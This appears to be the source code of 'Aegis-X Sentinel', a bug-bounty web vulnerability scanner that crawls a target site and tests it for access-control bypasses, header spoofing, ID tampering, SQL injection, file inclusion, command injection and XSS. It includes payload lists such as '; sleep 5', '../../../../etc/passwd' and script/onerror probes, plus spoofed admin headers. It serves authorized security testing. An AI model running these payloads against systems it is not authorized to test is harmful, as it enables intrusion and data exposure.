"""
# ==============================================================================
# AEGIS-X: SENTINEL v16.0 (The Elite Hunter)
# World-Class Automated Security Framework
# ==============================================================================
#
# [CORE ARCHITECTURE]
# 1. Deep Discovery: Sitemaps, Robots.txt, and Playwright JS Event Triggers.
# 2. Logic Hunter: Stateful ID harvesting and Cross-ID injection (Step Skipping).
# 3. Adaptive Fuzzing: Server-Header aware payload selection (Nginx vs Apache).
# 4. Privilege Matrix: Simultaneous Admin/User/Guest testing + Header Spoofing.
#
# [IDENTITY & COMPLIANCE]
# Researcher: Abdullah1805
# Header: X-Hackerone: Abdullah1805 (Enforced on ALL requests)
# ==============================================================================
"""

import subprocess
import sys
import os

# ==========================================
# 0. AUTO-SETUP (Serverless Compatible)
# ==========================================
def setup_env():
    """
    Ensures Playwright and Chromium are installed before the app loads.
    Uses a lockfile to prevent redundant installations.
    """
    lock_file = "playwright_v16.lock"
    if os.path.exists(lock_file): return

    print("⚙️ [Auto-Setup] Initializing Sentinel v16.0 Environment...")
    try:
        import playwright
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "playwright"])

    try:
        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=False)
        subprocess.run([sys.executable, "-m", "playwright", "install-deps"], check=False)
    except Exception as e:
        print(f"   [!] Browser install warning: {e}")

    with open(lock_file, "w") as f: f.write("installed")
    print("✅ [Auto-Setup] Ready.")

setup_env()

# ==========================================
# IMPORTS
# ==========================================
import streamlit as st
import asyncio
import httpx
import re
import json
import random
import logging
import threading
import queue
import time  # <--- FIXED: Added missing time import
import aiodns
import ipaddress
import psutil
import traceback
import base64
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote, unquote
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Set, Tuple
from bs4 import BeautifulSoup
from io import BytesIO

# Database
from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker
from sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column
from sqlalchemy import select, String, Text, text
from playwright.async_api import async_playwright

# Reporting
from reportlab.lib.pagesizes import LETTER
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, Spacer, Image, PageBreak
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle

# ==========================================
# 1. CONFIGURATION & IDENTITY
# ==========================================
st.set_page_config(page_title="Aegis-X: Sentinel v16.0", layout="wide", page_icon="🛡️")

class SecurityConfig:
    ADMIN_PASSWORD = "AegisX_Sentinel_2026"
    
    # --- [IDENTITY ENFORCEMENT] ---
    BOUNTY_IDENTITY = "Abdullah1805" 
    
    HEADERS = {
        "User-Agent": "Aegis-X/Sentinel v16.0 (Elite Hunter)",
        "X-Hackerone": BOUNTY_IDENTITY, # Mandatory Header
        "Accept": "*/*"
    }
    
    # Bypass Headers for Spoofing
    SPOOF_HEADERS = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Host": "127.0.0.1",
        "X-Forwarded-Host": "127.0.0.1",
        "X-Admin": "true",
        "X-Role": "admin"
    }
    
    BLOCKED_RANGES = [
        ipaddress.ip_network("127.0.0.0/8"),
        ipaddress.ip_network("10.0.0.0/8"),
        ipaddress.ip_network("172.16.0.0/12"),
        ipaddress.ip_network("192.168.0.0/16"),
        ipaddress.ip_network("169.254.0.0/16"),
        ipaddress.ip_network("::1/128"),
    ]

# ==========================================
# 2. LOGGING & OBSERVABILITY
# ==========================================
attack_queue = queue.Queue()
system_queue = queue.Queue()

class QueueHandler(logging.Handler):
    def __init__(self, target_queue):
        super().__init__()
        self.target_queue = target_queue
    def emit(self, record):
        self.target_queue.put(self.format(record))

sys_logger = logging.getLogger("Aegis-System")
sys_logger.setLevel(logging.INFO)
if not sys_logger.handlers:
    h = QueueHandler(system_queue)
    h.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%H:%M:%S'))
    sys_logger.addHandler(h)

atk_logger = logging.getLogger("Aegis-Attack")
atk_logger.setLevel(logging.INFO)
if not atk_logger.handlers:
    h = QueueHandler(attack_queue)
    h.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%H:%M:%S'))
    atk_logger.addHandler(h)

# ==========================================
# 3. DATABASE (PERSISTENCE)
# ==========================================
class Base(DeclarativeBase): pass

class Finding(Base):
    __tablename__ = "findings"
    id: Mapped[int] = mapped_column(primary_key=True)
    url: Mapped[str] = mapped_column(String)
    vuln_type: Mapped[str] = mapped_column(String)
    severity: Mapped[str] = mapped_column(String)
    payload: Mapped[str] = mapped_column(Text)
    mutation_used: Mapped[str] = mapped_column(String) 
    evidence: Mapped[str] = mapped_column(Text)
    curl_command: Mapped[str] = mapped_column(Text)
    screenshot_b64: Mapped[str] = mapped_column(Text, nullable=True)
    remediation: Mapped[str] = mapped_column(Text)
    timestamp: Mapped[datetime] = mapped_column(default=datetime.utcnow)

class StateManager:
    def __init__(self):
        self.engine = create_async_engine("sqlite+aiosqlite:///aegis_v16.db", echo=False)
        self.async_session = async_sessionmaker(self.engine, expire_on_commit=False)

    async def init_db(self):
        async with self.engine.begin() as conn:
            await conn.execute(text("PRAGMA journal_mode=WAL;"))
            await conn.run_sync(Base.metadata.create_all)

    async def save_finding(self, **kwargs):
        async with self.async_session() as session:
            f = Finding(**kwargs)
            session.add(f)
            await session.commit()
            sys_logger.critical(f"[{kwargs['severity']}] {kwargs['vuln_type']} confirmed at {kwargs['url']}")

    async def get_all_findings(self):
        async with self.async_session() as session:
            result = await session.execute(select(Finding).order_by(Finding.severity, Finding.timestamp.desc()))
            return result.scalars().all()

# ==========================================
# 4. DEEP DISCOVERY & THE HARVESTER
# ==========================================
@dataclass
class InjectionPoint:
    url: str
    method: str
    params: Dict[str, str]
    context: str = "generic" # generic, html, attr, script, api, idor
    priority: int = 1 # 1=Low, 5=Critical
    server_type: str = "Unknown"
    baseline_len: int = 0
    baseline_status: int = 200
    baseline_body: str = "" 

class TheHarvester:
    """
    [GLOBAL MEMORY] Tracks IDs discovered across the entire scan lifecycle.
    """
    discovered_ids: Set[str] = set()

    @staticmethod
    def harvest(content: str):
        # Harvest Integers (4-10 digits)
        ids = re.findall(r'\b\d{4,10}\b', content)
        # Harvest UUIDs
        uuids = re.findall(r'\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b', content)
        for i in ids: TheHarvester.discovered_ids.add(i)
        for u in uuids: TheHarvester.discovered_ids.add(u)

class ReconUnit:
    """
    [DEEP DISCOVERY] Fetches sitemaps and robots.txt.
    """
    @staticmethod
    async def run_recon(base_url: str, client: httpx.AsyncClient) -> List[str]:
        discovered_urls = set()
        parsed = urlparse(base_url)
        root = f"{parsed.scheme}://{parsed.netloc}"
        
        # 1. Robots.txt
        try:
            res = await client.get(urljoin(root, "/robots.txt"))
            if res.status_code == 200:
                for line in res.text.splitlines():
                    if "Allow:" in line or "Disallow:" in line:
                        path = line.split(":")[1].strip()
                        discovered_urls.add(urljoin(root, path))
        except: pass

        # 2. Sitemap.xml
        try:
            res = await client.get(urljoin(root, "/sitemap.xml"))
            if res.status_code == 200:
                locs = re.findall(r'<loc>(.*?)</loc>', res.text)
                for loc in locs: discovered_urls.add(loc)
        except: pass
        
        return list(discovered_urls)

class DeepMiner:
    @staticmethod
    def calculate_priority(url: str, params: Dict[str, str]) -> int:
        score = 1
        high_value_keywords = ["admin", "login", "api", "v1", "v2", "billing", "profile", "account", "upload", "config", "order", "invoice"]
        param_keywords = ["id", "user", "token", "key", "file", "cmd", "debug", "oid", "uid"]
        
        url_lower = url.lower()
        for kw in high_value_keywords:
            if kw in url_lower: score += 2
        for p in params.keys():
            for kw in param_keywords:
                if kw in p.lower(): score += 1
        return min(score, 5)

    @staticmethod
    def mine_static(url: str, html: str) -> List[InjectionPoint]:
        points = []
        TheHarvester.harvest(html)
        try:
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form'):
                action = form.get('action')
                method = form.get('method', 'get').upper()
                target = urljoin(url, action) if action else url
                inputs = {inp.get('name'): "AEGIS" for inp in form.find_all(['input', 'textarea']) if inp.get('name')}
                if inputs: 
                    prio = DeepMiner.calculate_priority(target, inputs)
                    points.append(InjectionPoint(target, method, inputs, context="html", priority=prio))
            if "?" in url:
                base, qs = url.split('?', 1)
                params = {k: v[0] for k,v in parse_qs(qs).items()}
                prio = DeepMiner.calculate_priority(base, params)
                points.append(InjectionPoint(base, "GET", params, context="attr", priority=prio))
        except: pass
        return points

    @staticmethod
    async def mine_dynamic(url: str, session_token: str = None) -> List[InjectionPoint]:
        points = []
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                headers = {"X-Hackerone": SecurityConfig.HEADERS["X-Hackerone"]}
                if session_token:
                    if "user=" in session_token or "session=" in session_token: headers["Cookie"] = session_token
                    else: headers["Authorization"] = f"Bearer {session_token}"

                context = await browser.new_context(
                    user_agent=SecurityConfig.HEADERS["User-Agent"],
                    extra_http_headers=headers
                )
                page = await context.new_page()
                
                # [JS EVENT TRIGGER]
                async def handle_request(request):
                    if request.resource_type in ["xhr", "fetch"]:
                        TheHarvester.harvest(request.url)
                        if "?" in request.url or request.post_data:
                            method = request.method
                            target = request.url
                            params = {}
                            if "?" in target:
                                base, qs = target.split('?', 1)
                                params.update({k: v[0] for k,v in parse_qs(qs).items()})
                                target = base
                            if request.post_data:
                                try:
                                    json_data = json.loads(request.post_data)
                                    if isinstance(json_data, dict): params.update(json_data)
                                except: pass
                            if params:
                                prio = DeepMiner.calculate_priority(target, params)
                                points.append(InjectionPoint(target, method, params, context="api", priority=prio))

                page.on("request", handle_request)
                page.on("response", lambda response: asyncio.create_task(DeepMiner._safe_harvest_response(response)))

                try:
                    await page.goto(url, wait_until="networkidle", timeout=15000)
                    
                    # [ELITE] Auto-Clicker & Scroller to trigger lazy XHR
                    await page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                    await asyncio.sleep(1)
                    buttons = await page.query_selector_all("button, a.btn, input[type='submit']")
                    for btn in buttons[:5]: # Limit to first 5 to avoid loops
                        try:
                            if await btn.is_visible(): await btn.click(timeout=500)
                        except: pass
                    
                except: pass
                await browser.close()
        except Exception as e:
            sys_logger.warning(f"Deep Mining Warning: {e}")
        return points

    @staticmethod
    async def _safe_harvest_response(response):
        try:
            if "json" in response.headers.get("content-type", ""):
                text = await response.text()
                TheHarvester.harvest(text)
        except: pass

# ==========================================
# 5. SERVER-AWARE ADAPTIVE FUZZING
# ==========================================
class PayloadFactory:
    @staticmethod
    def get_server_specific_payloads(payload: str, server_type: str) -> List[tuple]:
        """
        [ADAPTIVE] Tailors payloads based on Server Header.
        """
        variants = [("Original", payload), ("URL Encoded", quote(payload))]
        
        st = server_type.lower()
        if "nginx" in st:
            variants.append(("Null Byte", payload + "%00"))
            variants.append(("Double URL", quote(quote(payload))))
        elif "apache" in st:
            variants.append(("Double URL", quote(quote(payload))))
            variants.append(("Unicode Bypass", payload.replace("<", "%u003c")))
        elif "iis" in st:
            variants.append(("Unicode Bypass", payload.replace("<", "%u003c")))
            variants.append(("Double Encode", quote(quote(payload))))
        else:
            # Generic
            variants.append(("Double URL", quote(quote(payload))))
        
        return variants

    @staticmethod
    def get_base_payloads(vuln_type: str) -> List[str]:
        if vuln_type == "XSS":
            trigger = "window.AEGIS_EXECUTED()"
            return [f"<script>{trigger}</script>", f"\"><img src=x onerror={trigger}>", f"javascript:{trigger}"]
        elif vuln_type == "SQLI_TIME":
            return ["1' WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)--", "1' OR SLEEP(5)--"]
        elif vuln_type == "LFI":
            return ["../../../../etc/passwd", "....//....//....//etc/passwd"]
        elif vuln_type == "RCE":
            return ["; sleep 5", "| sleep 5", "`sleep 5`"]
        return []

# ==========================================
# 6. SENTINEL ENGINE (ELITE HUNTER)
# ==========================================
class SentinelEngine:
    def __init__(self, db: StateManager, limiter: Any, watchdog: Any, tokens: Dict[str, str]):
        self.db = db
        self.limiter = limiter
        self.watchdog = watchdog
        self.tokens = tokens # {'Admin': '...', 'User': '...', 'Guest': None}
        
        # Initialize Clients for Privilege Matrix
        self.clients = {}
        for role, token in tokens.items():
            headers = SecurityConfig.HEADERS.copy()
            if token:
                if "user=" in token or "session=" in token: headers["Cookie"] = token
                else: headers["Authorization"] = f"Bearer {token}"
            self.clients[role] = httpx.AsyncClient(verify=False, timeout=10.0, follow_redirects=True, headers=headers)

        self.validator_queue = asyncio.Queue()

    async def scan_target(self, target_url: str, stop_event: asyncio.Event):
        try:
            # 1. Reconnaissance
            sys_logger.info("Phase 1: Reconnaissance (Sitemaps & Robots)...")
            recon_urls = await ReconUnit.run_recon(target_url, self.clients["Guest"])
            sys_logger.info(f"Recon: Discovered {len(recon_urls)} hidden URLs.")
            
            # 2. Deep Mining
            sys_logger.info("Phase 2: Deep Mining & JS Event Triggering...")
            await self.limiter.acquire()
            
            discovery_role = "User" if self.tokens.get("User") else "Guest"
            res = await self.clients[discovery_role].get(target_url)
            
            points = DeepMiner.mine_static(target_url, res.text)
            dynamic_points = await DeepMiner.mine_dynamic(target_url, self.tokens.get(discovery_role))
            points.extend(dynamic_points)
            
            # Add Recon URLs to mining
            for r_url in recon_urls:
                points.append(InjectionPoint(r_url, "GET", {}, context="recon", priority=3))

            points.sort(key=lambda x: x.priority, reverse=True)
            sys_logger.info(f"Discovery: {len(points)} endpoints. Harvested IDs: {len(TheHarvester.discovered_ids)}")

            # 3. Execution (Concurrent Batches)
            batch_size = 5
            for i in range(0, len(points), batch_size):
                if stop_event.is_set(): break
                batch = points[i:i+batch_size]
                tasks = [self._process_point(p) for p in batch]
                await asyncio.gather(*tasks)

        except Exception as e:
            sys_logger.error(f"Scan Error: {e}")

    async def _process_point(self, point: InjectionPoint):
        await self._establish_baseline(point)
        await self._analyze_privilege_matrix(point)
        await self._analyze_header_spoofing(point)
        await self._analyze_logic_chain(point)
        await self._fuzz_injection(point)

    async def _establish_baseline(self, point: InjectionPoint):
        try:
            client = self.clients.get("User") or self.clients.get("Guest")
            await self.limiter.acquire()
            if point.method == "GET":
                res = await client.get(point.url, params=point.params)
            else:
                res = await client.post(point.url, data=point.params)
            point.baseline_len = len(res.text)
            point.baseline_status = res.status_code
            point.server_type = res.headers.get("Server", "Unknown")
        except: pass

    async def _analyze_privilege_matrix(self, point: InjectionPoint):
        """
        [PRIVILEGE MATRIX] Tests endpoint against Admin, User, and Guest roles.
        """
        if point.priority < 2: return
        results = {}
        for role, client in self.clients.items():
            try:
                await self.limiter.acquire()
                if point.method == "GET": res = await client.get(point.url, params=point.params)
                else: res = await client.post(point.url, data=point.params)
                results[role] = res.status_code
            except: results[role] = "Err"

        # Heuristic: Admin endpoint accessible by Guest/User
        if ("admin" in point.url.lower() or "config" in point.url.lower()) and results.get("Guest") == 200:
             await self.db.save_finding(
                url=point.url, vuln_type="Broken Access Control (Privilege Escalation)", severity="Critical",
                payload="[Privilege Matrix Test]", mutation_used="Role Rotation",
                evidence=f"Admin Endpoint accessible by Guest. Matrix: {results}",
                curl_command=f"curl '{point.url}'",
                remediation="Enforce strict RBAC.", screenshot_b64=None
            )

    async def _analyze_header_spoofing(self, point: InjectionPoint):
        """
        [HEADER SPOOFING] Injects headers to bypass IP/Role restrictions.
        """
        if point.baseline_status in [403, 401]:
            client = self.clients.get("Guest")
            for h_name, h_val in SecurityConfig.SPOOF_HEADERS.items():
                try:
                    spoof_headers = client.headers.copy()
                    spoof_headers[h_name] = h_val
                    await self.limiter.acquire()
                    if point.method == "GET": res = await client.get(point.url, params=point.params, headers=spoof_headers)
                    else: res = await client.post(point.url, data=point.params, headers=spoof_headers)
                    
                    if res.status_code == 200:
                        await self.db.save_finding(
                            url=point.url, vuln_type="Access Control Bypass (Header Spoofing)", severity="High",
                            payload=f"{h_name}: {h_val}", mutation_used="Header Injection",
                            evidence=f"Bypassed {point.baseline_status} using spoofed header.",
                            curl_command=f"curl '{point.url}' -H '{h_name}: {h_val}'",
                            remediation="Do not trust client-supplied headers for auth.", screenshot_b64=None
                        )
                        break
                except: pass

    async def _analyze_logic_chain(self, point: InjectionPoint):
        """
        [LOGIC HUNTER] Cross-ID Injection & Step Skipping.
        """
        # Only target sensitive endpoints for logic attacks
        if not any(k in point.url.lower() for k in ["invoice", "order", "account", "billing"]): return
        
        harvested = list(TheHarvester.discovered_ids)
        if not harvested: return
        
        # Find ID params
        id_params = [k for k, v in point.params.items() if str(v).isdigit() or "id" in k.lower()]
        
        for key in id_params:
            # Try injecting IDs found elsewhere (Cross-Pollination)
            for stolen_id in harvested[:5]: # Limit to 5
                if stolen_id == point.params[key]: continue
                
                mutated_params = point.params.copy()
                mutated_params[key] = stolen_id
                
                client = self.clients.get("User") or self.clients.get("Guest")
                try:
                    await self.limiter.acquire()
                    if point.method == "GET": res = await client.get(point.url, params=mutated_params)
                    else: res = await client.post(point.url, data=mutated_params)
                    
                    if res.status_code == 200 and len(res.text) > 50 and res.text != point.baseline_body: # Heuristic
                        await self.db.save_finding(
                            url=point.url, vuln_type="Logic Flaw (Cross-ID Injection)", severity="High",
                            payload=f"{key}={stolen_id}", mutation_used="Workflow Cross-Pollination",
                            evidence=f"Accessed resource using ID harvested from another endpoint.",
                            curl_command=f"curl '{point.url}' -d '{key}={stolen_id}'",
                            remediation="Validate user ownership of all requested IDs.", screenshot_b64=None
                        )
                except: pass

    async def _fuzz_injection(self, point: InjectionPoint):
        vectors = ["SQLI_TIME", "LFI", "RCE"]
        client = self.clients.get("User") or self.clients.get("Guest")
        
        for v_type in vectors:
            base_payloads = PayloadFactory.get_base_payloads(v_type)
            for base in base_payloads:
                # [ADAPTIVE] Server-Aware Mutations
                mutations = PayloadFactory.get_server_specific_payloads(base, point.server_type)
                
                for mut_name, payload in mutations:
                    await self.watchdog.is_safe.wait()
                    await self.limiter.acquire()
                    
                    if await self._inject(client, point, payload, v_type, mut_name): 
                        break

        if await self._inject(client, point, "AEGIS_PROBE", "Probe", "Original", check_reflection=True):
            await self.validator_queue.put(point)

    async def _inject(self, client, point: InjectionPoint, payload: str, v_type: str, mut_name: str, check_reflection=False) -> bool:
        try:
            params = point.params.copy()
            target_key = list(params.keys())[0]
            params[target_key] = payload
            
            atk_logger.info(f"[{v_type}] {mut_name} -> {point.url}")
            start_t = time.time()
            
            try:
                if point.method == "GET": res = await client.get(point.url, params=params)
                else: res = await client.post(point.url, data=params)
                elapsed = time.time() - start_t
            except httpx.TimeoutException:
                elapsed = 10.0
                res = None

            if res is None: return False

            if v_type in ["SQLI_TIME", "RCE"] and "sleep" in unquote(payload).lower():
                if elapsed > 4.5:
                    await self.db.save_finding(
                        url=point.url, vuln_type=v_type, severity="Critical",
                        payload=payload, mutation_used=mut_name,
                        evidence=f"Delay: {elapsed:.2f}s",
                        curl_command=f"curl '{point.url}' -d '{urlencode(params)}'",
                        remediation="Sanitize inputs.", screenshot_b64=None
                    )
                    return True

            if check_reflection and payload in res.text: return True

            patterns = {"LFI": (r"root:x:0:0", "High"), "RCE": (r"uid=\d+\(root\)", "Critical")}
            if v_type in patterns:
                regex, sev = patterns[v_type]
                if re.search(regex, res.text):
                    await self.db.save_finding(
                        url=point.url, vuln_type=v_type, severity=sev,
                        payload=payload, mutation_used=mut_name,
                        evidence=f"Regex: {regex}",
                        curl_command=f"curl '{point.url}' -d '{urlencode(params)}'",
                        remediation="Input Validation.", screenshot_b64=None
                    )
                    return True
            return False
        except: return False

    async def close(self): 
        for c in self.clients.values(): await c.aclose()

# ==========================================
# 7. VALIDATOR (PERSISTENT CONTEXT)
# ==========================================
class XSSValidator:
    def __init__(self, db: StateManager, watchdog: Any):
        self.db = db
        self.watchdog = watchdog

    async def worker(self, queue: asyncio.Queue, stop_event: asyncio.Event):
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(
                    user_agent=SecurityConfig.HEADERS["User-Agent"],
                    extra_http_headers={"X-Hackerone": SecurityConfig.HEADERS["X-Hackerone"]}
                )
                
                while not stop_event.is_set():
                    try:
                        try:
                            point = await asyncio.wait_for(queue.get(), timeout=1.0)
                        except asyncio.TimeoutError: continue

                        await self.watchdog.is_safe.wait()
                        page = await context.new_page()
                        
                        vuln_confirmed = False
                        async def on_exec():
                            nonlocal vuln_confirmed
                            vuln_confirmed = True
                        await page.expose_function("AEGIS_EXECUTED", on_exec)
                        
                        trigger = "window.AEGIS_EXECUTED()"
                        payloads = [f"<script>{trigger}</script>", f"\"><img src=x onerror={trigger}>"]
                        
                        for payload in payloads:
                            params = point.params.copy()
                            target_key = list(params.keys())[0]
                            params[target_key] = payload
                            try:
                                if point.method == "GET":
                                    qs = urlencode(params)
                                    await page.goto(f"{point.url}?{qs}", wait_until="domcontentloaded", timeout=5000)
                                await page.wait_for_timeout(1000)
                                if vuln_confirmed:
                                    screenshot = await page.screenshot(type='jpeg', quality=50)
                                    b64_img = base64.b64encode(screenshot).decode()
                                    await self.db.save_finding(
                                        url=point.url, vuln_type="Reflected XSS", severity="High",
                                        payload=payload, mutation_used="Browser Validation",
                                        evidence="JS Hook Triggered (Screenshot Captured)",
                                        curl_command=f"curl '{point.url}?{qs}'",
                                        remediation="Encoding", screenshot_b64=b64_img
                                    )
                                    break
                            except: pass
                        
                        await page.close()
                        queue.task_done()
                    except Exception: pass
                
                await context.close()
                await browser.close()
        except Exception: pass

# ==========================================
# 8. PROFESSIONAL REPORTING
# ==========================================
class ProfessionalReporter:
    @staticmethod
    def generate_pdf(findings: List[Finding]) -> bytes:
        buffer = BytesIO()
        doc = SimpleDocTemplate(buffer, pagesize=LETTER)
        styles = getSampleStyleSheet()
        elements = []

        elements.append(Paragraph("Aegis-X Sentinel v16.0", styles['Title']))
        elements.append(Paragraph("Elite Hunter Assessment Report", styles['Heading2']))
        elements.append(Spacer(1, 24))
        elements.append(Paragraph(f"<b>Researcher:</b> {SecurityConfig.BOUNTY_IDENTITY}", styles['Normal']))
        elements.append(Paragraph(f"<b>Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M')}", styles['Normal']))
        elements.append(PageBreak())

        for i, f in enumerate(findings, 1):
            color = colors.red if f.severity == "Critical" else colors.orange if f.severity == "High" else colors.blue
            elements.append(Paragraph(f"#{i} [{f.severity}] {f.vuln_type}", styles['Heading2']))
            elements.append(Paragraph(f"<b>Target:</b> {f.url}", styles['Normal']))
            elements.append(Paragraph(f"<b>Mutation:</b> {f.mutation_used}", styles['Normal']))
            elements.append(Spacer(1, 6))
            
            p_style = ParagraphStyle('Code', parent=styles['Code'], backColor=colors.lightgrey, borderPadding=5)
            elements.append(Paragraph(f"Payload: {f.payload}", p_style))
            elements.append(Spacer(1, 6))
            
            elements.append(Paragraph(f"<b>Evidence:</b> {f.evidence}", styles['Normal']))

            if f.screenshot_b64:
                try:
                    img_data = base64.b64decode(f.screenshot_b64)
                    img_io = BytesIO(img_data)
                    img = Image(img_io, width=400, height=250)
                    elements.append(Spacer(1, 10))
                    elements.append(img)
                except: pass
            
            elements.append(Spacer(1, 10))
            elements.append(Paragraph(f"<b>Remediation:</b> {f.remediation}", styles['Normal']))
            elements.append(Paragraph("_"*60, styles['Normal']))
            elements.append(Spacer(1, 20))

        doc.build(elements)
        buffer.seek(0)
        return buffer.getvalue()

# ==========================================
# 9. ORCHESTRATOR
# ==========================================
class ResourceWatchdog:
    def __init__(self):
        self.is_safe = asyncio.Event()
        self.is_safe.set()
        self.running = True
    async def monitor(self):
        while self.running:
            if psutil.virtual_memory().percent > 90: self.is_safe.clear()
            else: self.is_safe.set()
            await asyncio.sleep(2)
    def stop(self): self.running = False

class AdaptiveLimiter:
    def __init__(self, rps):
        self.rate = rps
        self._lock = asyncio.Lock()
    async def acquire(self):
        async with self._lock: await asyncio.sleep(1/self.rate)

class TaskOrchestrator(threading.Thread):
    def __init__(self, target, rps, tokens):
        super().__init__()
        self.target = target
        self.rps = rps
        self.tokens = tokens
        self.stop_event = asyncio.Event()

    def run(self):
        try:
            asyncio.run(self._workflow())
        except Exception as e:
            sys_logger.error(f"Orchestrator Crash: {e}")

    async def _workflow(self):
        db = StateManager()
        await db.init_db()
        limiter = AdaptiveLimiter(self.rps)
        watchdog = ResourceWatchdog()
        engine = SentinelEngine(db, limiter, watchdog, self.tokens)
        validator = XSSValidator(db, watchdog)

        asyncio.create_task(watchdog.monitor())
        val_task = asyncio.create_task(validator.worker(engine.validator_queue, self.stop_event))

        sys_logger.info("Phase 1: Deep Discovery & Logic Analysis...")
        await engine.scan_target(self.target, self.stop_event)
        
        sys_logger.info("Phase 2: Validating Evidence...")
        while not engine.validator_queue.empty() and not self.stop_event.is_set():
            await asyncio.sleep(1)
        
        self.stop_event.set()
        watchdog.stop()
        await engine.close()
        await val_task
        sys_logger.info("Scan Complete.")

    def stop(self):
        self.stop_event.set()

# ==========================================
# 10. UI (STREAMLIT)
# ==========================================
def main():
    if 'auth' not in st.session_state: st.session_state['auth'] = False
    
    if not st.session_state['auth']:
        st.title("🔒 Aegis-X Sentinel v16.0")
        if st.text_input("Access Key", type="password") == SecurityConfig.ADMIN_PASSWORD:
            if st.button("Unlock System"):
                st.session_state['auth'] = True
                st.rerun()
        return

    st.title("🛡️ Aegis-X: Sentinel v16.0 (Elite Hunter)")
    st.caption(f"Identity: {SecurityConfig.BOUNTY_IDENTITY} | Engine: Logic Chaining | Fuzzer: Server-Aware")
    
    with st.sidebar:
        st.header("Mission Control")
        target = st.text_input("Target URL", "http://testphp.vulnweb.com/listproducts.php?cat=1")
        
        st.subheader("Privilege Matrix")
        token_admin = st.text_input("Admin Token", placeholder="Optional")
        token_user = st.text_input("User Token", placeholder="Required for Logic Tests")
        token_guest = st.text_input("Guest Token", placeholder="Optional")
        
        rps = st.slider("Intensity (RPS)", 1, 50, 10)
        
        if st.button("🚀 Initiate Elite Scan"):
            if 'thread' not in st.session_state:
                tokens = {"Admin": token_admin, "User": token_user, "Guest": token_guest}
                t = TaskOrchestrator(target, rps, tokens)
                t.start()
                st.session_state['thread'] = t
                st.toast("Sentinel Engine Started")
        
        if st.button("🛑 Abort"):
            if 'thread' in st.session_state:
                st.session_state['thread'].stop()
                st.session_state['thread'].join()
                del st.session_state['thread']
                st.toast("Engine Stopped")

        st.divider()
        if st.button("📄 Download Elite Report"):
            async def get_data():
                db = StateManager()
                return await db.get_all_findings()
            findings = asyncio.run(get_data())
            pdf = ProfessionalReporter.generate_pdf(findings)
            st.download_button("Download PDF", pdf, "Aegis_v16_Report.pdf", "application/pdf")

    t1, t2, t3 = st.tabs(["⚔️ Live Operations", "⚙️ System Logs", "🐞 Vulnerability Vault"])
    
    def drain(q, k):
        if k not in st.session_state: st.session_state[k] = []
        while not q.empty(): st.session_state[k].append(q.get())
        return st.session_state[k]

    with t1: st.code("\n".join(drain(attack_queue, 'atk')[-20:]))
    with t2: st.code("\n".join(drain(system_queue, 'sys')[-20:]))
    with t3:
        async def show_findings():
            db = StateManager()
            return await db.get_all_findings()
        try:
            loop = asyncio.new_event_loop()
            findings = loop.run_until_complete(show_findings())
            loop.close()
            if findings:
                for f in findings:
                    color = "red" if f.severity == "Critical" else "orange" if f.severity == "High" else "blue"
                    with st.expander(f":{color}[{f.severity}] {f.vuln_type} - {f.url}"):
                        st.markdown(f"**Mutation:** `{f.mutation_used}`")
                        st.code(f.curl_command, language="bash")
                        st.markdown(f"**Evidence:**\n{f.evidence}")
                        if f.screenshot_b64:
                            st.image(base64.b64decode(f.screenshot_b64), caption="Evidence")
            else:
                st.info("No vulnerabilities detected yet.")
        except: pass

    if 'thread' in st.session_state and st.session_state['thread'].is_alive():
        time.sleep(1)
        st.rerun()

if __name__ == "__main__":
    main()
